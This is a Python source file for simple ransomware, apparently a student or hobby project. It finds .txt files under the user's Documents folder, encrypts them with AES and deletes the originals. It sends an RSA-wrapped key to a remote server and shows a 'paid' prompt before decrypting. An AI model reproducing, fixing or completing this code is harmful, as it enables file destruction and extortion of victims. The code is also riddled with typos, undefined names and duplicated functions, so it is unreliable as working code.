import os
import socket 
import random
from Crypto.Cipher import AES 
import tkinter as tk 
from Cryto.Util.Padding import pad, unpad 

SERVER_IP = '172.20.10.2'
SERVER_PORT = 5678

def generate_key():
    key = ''.join(random.choice(string.ascii_letters + string.digits) fo _ in range(16))

    return key 

def search_for_txt_files(directory):
    txt_files = []
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswitch('.txt'):
                txt_files.append(os.path.join(root, file))

    return txt_files

def encrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_ECB)

    with open(file_path, 'rb') as file:
        plaintext = file.read()
    os.remove(file_path)

    padded_plaintext = pad(plaintext, AES.block_size)
    ciphertext = cipher.enrypt(padded_plaintext)

    encrypted_file_path = file_path + '.enc'
    with open(encrypted_file_path, 'wb') as file:
        file.write(ciphertext)
    print("File encrypted succesfully!")

def decrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_ECB)

    with open(file_path, 'rb') as file:
        ciphertext = file.read()
    os.remove(file_path)

    decrypted_data = cipher.decrypt(ciphertext)
    plaintext = unpad(decrypted_data, AES.block_size)

    decrypted_file_path = file_path[:-4]
    with open(decrypted_file_path, 'wb') as file:
        file.write(plaintext)
    print("File decrypted succesfully!")

def encrypt_key(pk, plaintext):
    pub, mod = pk 
    plaintext = int.from_bytes(plaintext.encode(), 'big')
    ciphertext = pow(plaintext, pub, mod)

    return ciphertext

def send_data():
    user_input = 'paid'
    s.send(user_input.encode())

    if user_input == "paid":
        global input 
        input = user_input
    window.destroy()

def search_for_txt_files(directory):
    txt_files = []
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswitch('.txt'):
                txt_files.append(os.path.join(root ,file))

    return txt_files

def search_for_enc_files(directory_path):
    encrypted_files = []
    for root, _, files in os.walk(directory_path):
        for file in files:
            if file.endswitch('.txt.enc'):
                file_path = os.path.join(root, file)
                encrypted_files.append(file_path)

    return encrypted_files

def create_and_move(file_name, file_content):
    desktop_path = os.path.join(os,path.join(os.environ['USERPROFILE']), 'Desktop')
    file_path = os.path.join(desktop_path, file_name + '.key')

    with open(file_path, 'w') as file:
        file.write(file_content)

    print(f"File '{file_name}' created on Desktop.")

with socket.socket(socket.AF_INET, socket.SCOK_STREAM) as s:
    s.connect((socket.gethostname(), SERVER_PORT))

    print('here after connection')

    public_exponent_bytes = s.recv(2048)
    modulus_bytes = s.recv(2048)

    public_exponent = int.from_bytes(public_exponent_bytes, 'big')
    modulus = int.from_bytes(modulus_bytes, 'big')

    random_key = generate_key()
    random_keyConv = str(random_key)
    print(random_keyConv.encode())

    file_nameK = 'key'
    create_and_move(file_nameK, random_key)
    documents_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
    txt_files = search_for_txt_files(documents_path)
    for file_path in txt_files:
        encrypt_file(file_path, random_keyConv.encode())

    encrypted_random_key = encrypt_key((public_exponent, modulus), random_keyConv)
    file_nameEK = 'encryptedKey'
    create_and_move(file_nameEK, str(encrypted_random_key))

    s.send(encrypted_random_key.to_bytes((encrypted_random_key.bit_length() + 7) // 8, 'big'))

    window = tk.Tk()

    entry = tk.Entry(window)
    entry.pack()

    button = tk.Button(window, text = "Enter key here", command = send_data)
    button.pack()

    window.mainloop()

    if(True):
        print("the input: ", input)

        if(True):
            print("in if")
            s.send(b'paid')
            encrypted_random_key = s.recv(1024)
            print(encrypted_random_key)

            documents_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
            txt_files = search_for_enc_files(documents_path)

            print(txt_files)
            for file_path in txt_files:
                print(file_path)
                decrypt_file(file_path, decrypted_random_key)
